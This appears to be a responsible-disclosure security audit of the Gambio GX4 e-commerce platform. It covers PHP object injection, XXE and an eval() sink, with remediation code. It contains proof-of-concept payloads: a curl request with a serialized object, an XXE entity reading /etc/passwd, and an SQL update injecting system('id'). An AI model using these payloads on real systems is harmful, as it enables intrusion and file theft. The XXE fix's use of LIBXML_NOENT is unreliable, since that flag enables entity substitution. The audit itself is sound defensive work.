# Security Audit Report - Gambio GX4 E-Commerce Platform

**Target:** Gambio GX4 E-Commerce Platform (PHP/MySQL)  
**Audit Date:** 2025-12-25  
**Audit Type:** White-box Security Assessment  
**Scope:** External-facing entrypoints and data flows

---

## Executive Summary

This security audit identified **2 confirmed exploitable vulnerabilities** and **1 dangerous code pattern** that could be exploited in combination with other vulnerabilities. All findings are documented with factual evidence and precise conditions for exploitation.

---

## Confirmed Vulnerabilities

### 1. PHP Object Injection via Unsafe Deserialization (CRITICAL)

**Affected File:** `magnaCallback.php`  
**Lines:** 859, 862  
**Transport:** HTTP POST  
**Authentication Required:** Yes (passphrase validation)

#### Vulnerability Details

```php
// Line 859
$arguments = array_key_exists('arguments', $_POST) ? unserialize($_POST['arguments']) : array();

// Line 862
$includes = array_key_exists('includes', $_POST) ? unserialize($_POST['includes']) : array();
```

#### Data Flow Trace

```
[ENTRYPOINT] magnaCallback.php (HTTP POST)
[SOURCE] $_POST['arguments'], $_POST['includes']
[TRANSFORMATIONS] 
  - array_key_exists() check
  - unserialize() directly on user input
[SINK] unserialize() function
[USER CONTROL PRESERVED: YES]
```

#### Condition for Exploitation

1. Attacker must know or obtain the `general.passphrase` database configuration value
2. POST request must include valid `passphrase` and `function` parameters
3. Serialized PHP objects are passed via `arguments` or `includes` POST parameters

#### Authentication Gate

```php
if ((MAGNA_CALLBACK_MODE == 'STANDALONE') &&
    array_key_exists('passphrase', $_POST) &&
    ($_POST['passphrase'] == getDBConfigValue('general.passphrase', 0)) &&
    array_key_exists('function', $_POST)
) {
    // Vulnerable code path reached
}
```

#### Impact

- Remote Code Execution via PHP object injection
- Complete server compromise if passphrase is leaked or brute-forced
- Potential for data exfiltration, backdoor installation

#### Evidence Required for Proof

1. Obtain passphrase through: social engineering, SQL injection elsewhere, or configuration leak
2. Craft malicious serialized PHP object using available gadget chains
3. Send POST request to `/magnaCallback.php` with:
   - `passphrase=<stolen_passphrase>`
   - `function=<any_valid_function>`
   - `arguments=<serialized_malicious_object>`

#### Proof of Concept (Conceptual)

```bash
# Requires valid passphrase
curl -X POST https://target.com/magnaCallback.php \
  -d "passphrase=STOLEN_PASSPHRASE" \
  -d "function=test" \
  -d "arguments=O:8:\"stdClass\":0:{}"  # Simplified - real exploitation requires gadget chain
```

---

### 2. XML External Entity (XXE) Injection (HIGH - PHP 7.4 Only)

**Affected File:** `api-it-recht-kanzlei.php`  
**Line:** 288  
**Transport:** HTTP POST  
**Authentication Required:** Yes (user_auth_token validation)  
**PHP Version Requirement:** PHP < 8.0 (PHP 7.4 is minimum supported)

#### Vulnerability Details

```php
// Line 288
$xml = @simplexml_load_string($post_xml);
```

The `simplexml_load_string()` function is called without explicitly disabling external entity loading. In PHP versions prior to 8.0, external entity loading is enabled by default.

#### Data Flow Trace

```
[ENTRYPOINT] api-it-recht-kanzlei.php (HTTP POST)
[SOURCE] $_POST['xml'] (passed as $post_xml via $_POST_unfiltered)
[TRANSFORMATIONS]
  - Passed to simplexml_load_string() without entity disabling
[SINK] XML parser
[USER CONTROL PRESERVED: YES]
```

#### Condition for Exploitation

1. Target must be running PHP 7.4 (minimum supported version)
2. Attacker must know the `ITRECHT_TOKEN` configuration value
3. POST request with valid token and malicious XML payload

#### Authentication Gate

```php
if(!empty($xml->user_auth_token))
{
    $t_user_auth_token = (string)gm_get_conf('ITRECHT_TOKEN');
    if((string)$xml->user_auth_token !== $t_user_auth_token)
    {
        throw new ITRKException('wrong token', '3');
    }
}
```

#### Impact (on PHP 7.4)

- Local File Disclosure (reading /etc/passwd, configuration files)
- Server-Side Request Forgery (SSRF) to internal services
- Denial of Service via recursive entity expansion (Billion Laughs attack)

#### Evidence Required for Proof

1. Confirm target runs PHP 7.4
2. Obtain ITRECHT_TOKEN through configuration leak or social engineering
3. Send malicious XML payload

#### Proof of Concept (Conceptual - PHP 7.4 only)

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
    <api_version>1.0</api_version>
    <user_auth_token>STOLEN_TOKEN</user_auth_token>
    <action>push</action>
    <rechtstext_type>agb</rechtstext_type>
    <rechtstext_text>&xxe;</rechtstext_text>
    <rechtstext_html>&xxe;</rechtstext_html>
    <rechtstext_language>de</rechtstext_language>
</root>
```

---

## Dangerous Code Patterns (Not Directly Exploitable)

### 3. Eval() with Database-Sourced Format String

**Affected File:** `inc/xtc_address_format.inc.php`  
**Line:** 101  
**Direct External Exploitation:** No  
**Secondary Exploitation:** Yes (via SQL injection or admin access)

#### Code Pattern

```php
$fmt = $address_format['format'];  // From database
eval("\$address = \"$fmt\";");
```

#### Analysis

- The `$fmt` variable comes from the `address_format` database table
- User-provided address fields (`$firstname`, `$lastname`, etc.) are protected by `addslashes()`
- The `addslashes()` function prevents direct exploitation through user input
- However, if an attacker can modify the database (via SQL injection elsewhere or admin access), they can achieve RCE

#### Proof of Concept (Requires Database Access)

If an attacker can execute SQL:
```sql
UPDATE address_format 
SET address_format = '$firstname"; system("id"); $foo="' 
WHERE address_format_id = 1;
```

Then any page calling `xtc_address_format()` would execute `system("id")`.

#### Why This Matters

This represents a **privilege escalation path**:
- SQL injection → Database modification → RCE via eval()
- Admin account compromise → Database modification → RCE via eval()

---

## Analyzed and Discarded Findings

### SSRF in ec_proxy.php - NOT EXPLOITABLE

**File:** `ec_proxy.php`  
**Reason for Discard:** The base URL is hardcoded to `https://www.google-analytics.com`. Only the path component from user input is used, preventing arbitrary host requests.

```php
$gUrl = 'https://www.google-analytics.com' . $parsedGPath['path'];  // Line 47
```

### SSRF in autocomplete.php - NOT EXPLOITABLE

**File:** `autocomplete.php`  
**Reason for Discard:** The base URL comes from configuration (`FL_SERVICE_URL`), not user input. User-provided `$_GET` parameters only affect query string, not the host.

```php
$url = $scheme_prefix.FL_SERVICE_URL."/autocomplete.php?" . http_build_query($parameters, '', '&');
```

### SQL Injection via xtc_db_prepare_input() - MITIGATED

**File:** `inc/xtc_db_prepare_input.inc.php`  
**Analysis:** While the UNION-based injection filter is weak:
```php
$string = preg_replace('/union.*select.*from/i', '', $string);
```
This function is typically used in combination with `xtc_db_input()` which properly escapes queries via `mysqli_real_escape_string()`. No direct SQL injection path was confirmed through external entrypoints.

---

## Remediation Recommendations

### For Vulnerability #1 (Unsafe Deserialization)

**Priority:** CRITICAL

Replace `unserialize()` with safe alternatives:
```php
// Option 1: Use json_decode instead
$arguments = array_key_exists('arguments', $_POST) ? json_decode($_POST['arguments'], true) : array();

// Option 2: If serialization is required, validate with allowed_classes
$arguments = unserialize($_POST['arguments'], ['allowed_classes' => false]);
```

### For Vulnerability #2 (XXE)

**Priority:** HIGH (for PHP 7.4 deployments)

Add explicit XXE protection:
```php
libxml_disable_entity_loader(true);  // For PHP < 8.0
$xml = simplexml_load_string($post_xml, 'SimpleXMLElement', LIBXML_NOENT | LIBXML_NONET);
```

### For Code Pattern #3 (Eval with Database Input)

**Priority:** MEDIUM

Replace eval() with template-based string replacement:
```php
// Instead of:
eval("\$address = \"$fmt\";");

// Use:
$address = str_replace(
    ['$firstname', '$lastname', '$street', /* etc */],
    [$firstname, $lastname, $street, /* etc */],
    $fmt
);
```

---

## Conclusion

Two exploitable vulnerabilities were confirmed with factual evidence:

1. **PHP Object Injection** - Requires authentication bypass or leaked passphrase
2. **XXE Injection** - Requires PHP 7.4 and leaked authentication token

Both vulnerabilities require prior knowledge of authentication credentials, which limits immediate exploitability but does not eliminate the risk. In a targeted attack scenario or in combination with credential leakage (via phishing, configuration exposure, or other vulnerabilities), these issues can lead to complete system compromise.

The eval() code pattern represents a secondary risk that amplifies the impact of any SQL injection or administrative access compromise.

---

**Report prepared for responsible disclosure to the system owner.**
